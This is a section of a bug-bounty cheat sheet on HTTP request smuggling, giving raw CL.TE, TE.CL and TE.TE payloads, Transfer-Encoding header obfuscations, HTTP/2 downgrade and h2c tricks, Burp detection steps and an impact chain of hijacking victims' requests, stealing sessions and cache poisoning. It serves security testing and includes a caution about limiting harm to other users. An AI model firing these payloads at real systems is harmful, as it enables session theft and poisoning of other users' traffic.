## 17. HTTP REQUEST SMUGGLING
> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding front, Content-Length back)
Front trusts chunked, back trusts CL — the reverse desync. Body must be a valid chunk stream to the front, with the CL truncating what the back reads.
```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```
(front reads the whole chunked body; back reads only `5c` bytes → the rest smuggles as a new request.)

### TE.TE (both honor TE — obfuscate one so a proxy ignores it)
Both ends support TE, so **hide** the header from one:
```
Transfer-Encoding: xchunked      Transfer-Encoding : chunked   (space before colon)
Transfer-Encoding:\tchunked      Transfer-Encoding: chunked\r\n Transfer-Encoding: x
```
One end normalizes and de-chunks, the other falls back to CL → desync.

### H2.CL / H2.TE / h2c downgrade (HTTP/2 front, HTTP/1.1 back)
When an edge speaks HTTP/2 but the backend is HTTP/1.1, the front rebuilds a 1.1 request from h2 pseudo-headers and may **trust an injected `content-length`/`transfer-encoding`** you smuggle inside an h2 header value (h2 has no CL, so any CL you add is attacker-controlled). Also test **h2c upgrade** (`Upgrade: h2c`) to tunnel past the front proxy entirely. Use Burp's **HTTP Request Smuggler** in HTTP/2 mode + "HTTP/2 downgrade" probes; also try CRLF injection in an h2 header value to split the downgraded request.

Full copy-usable payload set (CL.TE/TE.CL/TE.TE/H2.CL): `security-arsenal/reference/http-smuggling-payloads.md`.

### Detection
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```
> **Safety/FP:** use the **time-based** probe (a desync makes the socket hang waiting for bytes) to confirm on shared infra — never fire a payload that poisons *other users'* requests on a live target beyond what's needed to prove it. A single self-poisoned follow-up request (your own second request comes back altered) is the clean, low-blast-radius PoC.

### Impact Chain
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

